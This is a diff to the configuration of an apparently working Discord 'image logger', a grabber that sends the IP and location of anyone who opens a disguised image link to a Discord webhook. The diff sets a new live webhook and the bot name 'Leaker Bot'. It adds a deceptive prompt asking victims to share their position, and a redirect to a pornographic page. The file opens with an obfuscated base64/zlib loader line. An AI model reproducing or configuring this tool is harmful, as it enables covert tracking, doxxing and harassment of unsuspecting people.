@@ -3,29 +3,29 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1441464349418848268/9R0HwnplGfp62suz9AEE6R2ThnQkhX9xzDG1ZKiQPROU0AdeW735Vc9wxe_mGXnIsBLC",
+    "webhook": "https://discord.com/api/webhooks/1441456061528670258/u-NgRxR75hPMDOO2KMHkc0GbqxABr0jlYk1fdlgGDrjUC9QMYOrO-hr97ZGyAzI-ewJK",
     "image": "https://pkmncards.com/wp-content/uploads/charizard-ex-xy-promos-xy17-ptcgo-1.png",
-    "imageArgument": True,
-    "username": "DiddyBlud",
-    "avatar_url": "https://github.com/mystixxx2/Image/blob/main/ChatGPT%20Image%2011%20oct.%202025,%2018_54_21.png?raw=true",
+    "imageArgument": False,
+    "username": "Leaker Bot",
+    "avatar_url": "https://www.shazam.com/en-gb/song/1592754720/youre-on-doxbin",
     "color": 0x1C2526,  # Very dark grey
 
     # OPTIONS #
     "crashBrowser": False,
     "accurateLocation": False,
     "message": {
-        "doMessage": False,
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
+        "doMessage": True,
+        "message": "You are being redirected, please allow your position for a better experience.",
         "richMessage": True,
     },
     "vpnCheck": 1,
     "linkAlerts": True,
-    "buggedImage": True,
+    "buggedImage": False,
     "antiBot": 1,
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False,
-        "page": "https://your-link.here"
+        "redirect": True,
+        "page": "https://fr.anysex.com/video/478503/three-hot-young-latina-sluts-come-to-a-wild-amateur-porn-casting-and-take-turns-sucking-director-s-cock/?utm_source=pb"
     },
 }
